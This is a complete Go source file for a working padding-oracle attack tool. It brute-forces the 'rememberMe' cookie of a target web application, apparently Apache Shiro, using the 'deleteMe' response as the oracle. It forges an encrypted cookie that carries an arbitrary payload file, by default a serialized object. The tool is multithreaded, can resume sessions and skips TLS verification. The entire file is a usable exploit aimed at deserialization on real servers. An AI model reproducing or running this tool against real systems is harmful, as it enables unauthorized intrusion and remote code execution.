package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type PaddingOracle struct {
	// Configuration
	RememberMeFile string
	PayloadFile    string
	SessionFile    string
	TargetUrl      string
	Attempts       int
	Threads        int
	Verbose        bool
	BlockSize      int
	Padding        byte
	Payload        []byte
	RememberMe     []byte
	Timeout        int

	// Runtime
	RequestCount   int64
	CurrentBlockId int
	Result         [][]byte
}

func (o *PaddingOracle) PayloadBlocks() [][]byte {
	var result [][]byte
	for i := 0; i < len(o.Payload); i += o.BlockSize {
		result = append(result, o.Payload[i:i+o.BlockSize])
	}
	return result
}

func (o *PaddingOracle) BlockCount() int {
	return int(math.Ceil(float64(len(o.Payload)) / float64(o.BlockSize)))
}

func (o *PaddingOracle) NextBlock() []byte {
	return o.Result[o.CurrentBlockId+1]
}

func (o *PaddingOracle) CheckPaddingAttackRequest(ctx context.Context, payload string) (bool, error) {
	req, err := http.NewRequest("GET", o.TargetUrl, nil)
	if err != nil {
		panic(err)
	}

	req.WithContext(ctx)

	req.Header.Add("User-Agent", "Mozilla/5.0")
	req.Header.Add("Referer", o.TargetUrl)
	req.Header.Add("Connection", "close")
	req.Header.Add("Cookie", fmt.Sprintf("rememberMe=%s", payload))

	atomic.AddInt64(&o.RequestCount, 1)

	timeout := time.Duration(o.Timeout) * time.Second

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DialContext: (&net.Dialer{
				Timeout: timeout,
			}).DialContext,
		},
		Timeout: timeout,
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}

	defer func() {
		if resp.Body != nil {
			_ = resp.Body.Close()
		}
	}()

	if resp.StatusCode != 200 {
		return false, fmt.Errorf("HTTP响应状态错误:%d", resp.StatusCode)
	}

	setCookie := strings.Join(resp.Header.Values("Set-Cookie"), "\n")

	if o.Verbose {
		log.Println("Set-Cookie: ", setCookie)
	}

	if strings.Contains(setCookie, "rememberMe=deleteMe") {
		return false, nil
	}

	return true, nil
}

func (o *PaddingOracle) Attack(ctx context.Context, blockId, index int, currentBlock []byte, payloadChan <-chan byte, successChan chan<- byte, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case c := <-payloadChan:

			currentBlock[index] = c
			payload := base64.StdEncoding.EncodeToString(append(o.RememberMe, append(currentBlock, o.NextBlock()...)...))

			if success, err := o.CheckPaddingAttackRequest(ctx, payload); err == nil {
				if o.Verbose {
					log.Printf("block: %d index: %d c:%d is %v\n", blockId, index, c, success)
				}

				if success {
					successChan <- c
					return
				}

			} else {
				if o.Verbose {
					log.Printf("block: %d index: %d c:%d is error. (Err: %v)\n", blockId, index, c, err)
				}
			}

		case <-ctx.Done():
			if o.Verbose {
				log.Println("ctx canceled")
			}
			return
		default:
			if o.Verbose {
				log.Println("the payload channel is empty")
			}
			return
		}
	}
}

func (o *PaddingOracle) FindCharacterEncrypt(index int, currentBlock []byte) (byte, bool) {
	if len(o.NextBlock()) != o.BlockSize {
		panic("nextBlock size error!!!")
	}

	successChan := make(chan byte)
	waitChan := make(chan bool)
	payloadChan := make(chan byte, 256)

	wg := sync.WaitGroup{}

	for c := 0; c < 256; c++ {
		payloadChan <- byte(c)
	}

	ctx, cancel := context.WithCancel(context.Background())

	defer cancel()

	for i := 0; i < o.Threads; i++ {
		wg.Add(1)
		go o.Attack(ctx, o.CurrentBlockId, index, currentBlock[:], payloadChan, successChan, &wg)
	}

	go func() {
		wg.Wait()
		waitChan <- true
	}()

	select {
	case result := <-successChan:
		return result, true
	case <-waitChan:
		return 0, false
	}

}

func (o *PaddingOracle) Attempt(index int, currentBlock []byte) (byte, bool) {

	for i := 0; i < o.Attempts; i++ {
		if c, ok := o.FindCharacterEncrypt(index, currentBlock); ok {
			return c, true
		} else {
			log.Printf("[Block #%03d Index: %02d] => Error: no suitable encryption character found, retrying... (%02d/%02d)\n", o.CurrentBlockId, index, i+1, o.Attempts)
		}
	}

	return 0, false
}

func (o *PaddingOracle) BlockEncrypt(payloadBlock []byte) ([]byte, bool) {
	iv := make([]byte, o.BlockSize)

	for index := o.BlockSize - 1; index >= 0; {

		indexStartTime := time.Now()

		paddingByte := byte(o.BlockSize - index)
		currentBlock := make([]byte, o.BlockSize)

		for ix := index; ix < o.BlockSize; ix++ {
			currentBlock[ix] = paddingByte ^ iv[ix]
		}

		c, ok := o.Attempt(index, currentBlock)

		// 如果成功并且这是当前block的最后一个index,一定要再确认一次,不然下一个block和之后的数据就全部都是错的
		if ok && index == 0 {
			c1, ok1 := o.Attempt(index, currentBlock)
			// 如果这次失败了,或者这次的加密结果和上次的不一样,则把ok置为false
			if !ok1 || c1 != c {
				ok = false
				log.Printf("[Block #%03d Index: %02d] => Danger: Unable to confirm the correct value of the current index!\n", o.CurrentBlockId, index)
			}
		}

		// 如果失败
		if !ok {
			// 如果不是第一个index,则回滚到上一个index
			if index < o.BlockSize-1 {
				log.Printf("[Block #%03d Index: %02d] => Error: the previous encrypted character may be wrong, rolling back to index: %02d ...\n", o.CurrentBlockId, index, index+1)
				index++
				continue
			}
			// 如果是第一个index,直接块级回滚
			return nil, false
		}

		iv[index] = c ^ paddingByte
		log.Printf("[Block #%03d Index: %02d] => 0x%s-%s | elapsed time: %v\n", o.CurrentBlockId, index, hex.EncodeToString(iv), hex.EncodeToString(o.NextBlock()), time.Now().Sub(indexStartTime))
		index--
	}

	result := make([]byte, o.BlockSize)

	for i := 0; i < o.BlockSize; i++ {
		result[i] = iv[i] ^ payloadBlock[i]
	}

	return result, true
}

func (o *PaddingOracle) Encrypt() error {

	log.Println("-------------------------------<Attacking>-------------------------------")
	encryptStartTime := time.Now()

	payloadBlocks := o.PayloadBlocks()
	blockCount := o.BlockCount()

	if o.CurrentBlockId < 0 {
		log.Println("No blocks to be encrypted")
		return nil
	}

	log.Printf("A total of %d/%d blocks need to be encrypted\n", o.CurrentBlockId+1, blockCount)

	for o.CurrentBlockId >= 0 {
		log.Printf("Attempting to encrypt the block #%03d\n", o.CurrentBlockId)
		blockStartTime := time.Now()
		prevRequestCount := atomic.LoadInt64(&o.RequestCount)
		encryptedBlock, ok := o.BlockEncrypt(payloadBlocks[o.CurrentBlockId])

		if !ok {
			// 如果不是第一个block,则回滚到上一个block
			if o.CurrentBlockId < blockCount-1 {
				log.Printf("[Block #%03d] => Error: the previous encrypted block may be wrong, rolling back to #%03d ... \n", o.CurrentBlockId, o.CurrentBlockId+1)
				o.CurrentBlockId++
				continue
			}
			// 如果是第一个block,则直接返回错误(可能原因: rememberMe数据错误)
			return fmt.Errorf("block encryption failed")
		}
		requestCount := atomic.LoadInt64(&o.RequestCount) - prevRequestCount
		duration := time.Now().Sub(blockStartTime)
		log.Printf("Block #%03d encrypted, elapsed time: %v, request count: %d (%d/s), total request: %d, %d/%d completed\n", o.CurrentBlockId, duration, requestCount, requestCount/int64(duration.Seconds()), atomic.LoadInt64(&o.RequestCount), blockCount-o.CurrentBlockId, blockCount)

		o.Result[o.CurrentBlockId] = encryptedBlock
		o.CurrentBlockId--
		if err := o.SaveState(); err != nil {
			log.Println("State saving failed:", err)
		} else {
			log.Println("Session state saved")
		}
	}

	log.Printf("All %d blocks are encrypted, elapsed time: %v\n", blockCount, time.Now().Sub(encryptStartTime))
	return nil
}

func (o *PaddingOracle) ShowResult() {
	log.Println("-------------------------------<Result>-------------------------------")
	result := base64.StdEncoding.EncodeToString(bytes.Join(o.Result, []byte{}))
	log.Println("[Result] =>", result)
	log.Println("[Request count] =>", o.RequestCount)
}

func (o *PaddingOracle) SaveState() error {
	bs, err := json.MarshalIndent(o, "", "  ")
	if err != nil {
		return err
	}
	return ioutil.WriteFile(o.SessionFile, bs, 0666)
}

func (o *PaddingOracle) Restore(sessionFile string) error {
	bs, err := ioutil.ReadFile(sessionFile)
	if err != nil {
		return err
	}
	if err := json.Unmarshal(bs, o); err != nil {
		return err
	}
	if o.Timeout == 0 {
		o.Timeout = 3
	}
	o.PrintConfiguration()
	log.Println("-------------------------------<Restore>-------------------------------")
	payloadBlock := o.PayloadBlocks()
	for i := len(o.Result) - 2; i >= 0; i-- {
		if len(o.Result[i]) != 0 {
			result := make([]byte, o.BlockSize)
			for index := 0; index < o.BlockSize; index++ {
				result[index] = o.Result[i][index] ^ payloadBlock[i][index]
			}
			log.Printf("[Block #%03d] => 0x%s-%s |", i, hex.EncodeToString(result), hex.EncodeToString(o.Result[i+1]))
		}
	}
	if err := o.Encrypt(); err != nil {
		return err
	}
	o.ShowResult()
	return nil
}

func (o *PaddingOracle) Run() error {
	if o.Padding == byte(0) {
		o.Padding = byte(rand.New(rand.NewSource(time.Now().UnixMicro())).Intn(127))
	}
	if o.Timeout == 0 {
		o.Timeout = 3
	}

	blockCount := o.BlockCount()

	o.Result = make([][]byte, blockCount+1)
	o.Result[blockCount] = bytes.Repeat([]byte{o.Padding}, o.BlockSize)
	o.CurrentBlockId = blockCount - 1

	o.PrintConfiguration()
	if err := o.Encrypt(); err != nil {
		return err
	}
	o.ShowResult()
	return nil
}

func (o *PaddingOracle) PrintConfiguration() {
	log.Println("-------------------------------<Configuration>-------------------------------")
	log.Println("[Target] =>", o.TargetUrl)
	log.Println("[Threads] =>", o.Threads)
	log.Println("[Timeout] =>", o.Timeout)
	log.Println("[Verbose] =>", o.Verbose)
	log.Println("[Padding] =>", fmt.Sprintf("0x%02x", o.Padding))
	log.Println("[Attempts] =>", o.Attempts)
	log.Println("[Block size] =>", o.BlockSize)
	log.Println("[Session file] =>", o.SessionFile)
	log.Println("[Payload file] =>", o.PayloadFile)
	log.Println("[Payload length] =>", len(o.Payload))
	log.Println("[RememberMe file] =>", o.RememberMeFile)
	log.Println("[RememberMe data] =>", base64.StdEncoding.EncodeToString(o.RememberMe))
}

func main() {

	rememberMeFile := flag.String("i", "rememberMe.txt", "rememberMe data file")
	payloadFile := flag.String("p", "payload.ser", "payload data file")
	blockSize := flag.Int("b", 16, "block size")
	sessionFile := flag.String("s", "", "session file")
	targetUrl := flag.String("u", "", "target url")
	attempts := flag.Int("a", 15, "number of attempts")
	threads := flag.Int("t", 16, "number of threads")
	verbose := flag.Bool("v", false, "verbose")
	customPadding := flag.Int("c", 0x00, "custom padding byte")
	restore := flag.String("r", "", "load session file to restore")
	timeout := flag.Int("d", 3, "timeout seconds")

	flag.Parse()

	if *restore != "" {
		po := &PaddingOracle{}
		if err := po.Restore(*restore); err != nil {
			panic(err)
		}
		return
	}

	if *targetUrl == "" {
		flag.Usage()
		return
	}

	if *threads > 256 {
		log.Println("The maximum number of threads is 256")
		return
	}

	if *attempts < 1 {
		log.Println("The minimum number of attempts is 1")
		return
	}

	rememberMeData, err := ioutil.ReadFile(*rememberMeFile)
	if err != nil {
		log.Println(err)
		return
	}

	payload, err := ioutil.ReadFile(*payloadFile)
	if err != nil {
		log.Println(err)
		return
	} else if len(payload) == 0 {
		log.Println("payload file is empty.")
		return
	}

	rememberMe, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(rememberMeData)))
	if err != nil {
		panic(err)
	}

	if *sessionFile == "" {
		*sessionFile = fmt.Sprintf("%s.session", time.Now().Format("2006-01-02_15-04-05"))
	}

	if _, err := os.Stat(*sessionFile); err == nil {
		log.Printf("The session file [%s] already exists, if you need to restore the session, please use the -r parameter", *sessionFile)
		return
	}

	po := &PaddingOracle{
		RememberMeFile: *rememberMeFile,
		PayloadFile:    *payloadFile,
		SessionFile:    *sessionFile,
		TargetUrl:      *targetUrl,
		Attempts:       *attempts,
		Threads:        *threads,
		Verbose:        *verbose,
		BlockSize:      *blockSize,
		Padding:        byte(*customPadding),
		Payload:        padding(payload, *blockSize),
		RememberMe:     rememberMe,
		Timeout:        *timeout,
	}

	if err := po.Run(); err != nil {
		panic(err)
	}

}

func padding(data []byte, blockSize int) []byte {
	length := blockSize - (len(data) % blockSize)
	bs := bytes.Repeat([]byte{byte(length)}, length)
	return append(data, bs...)
}
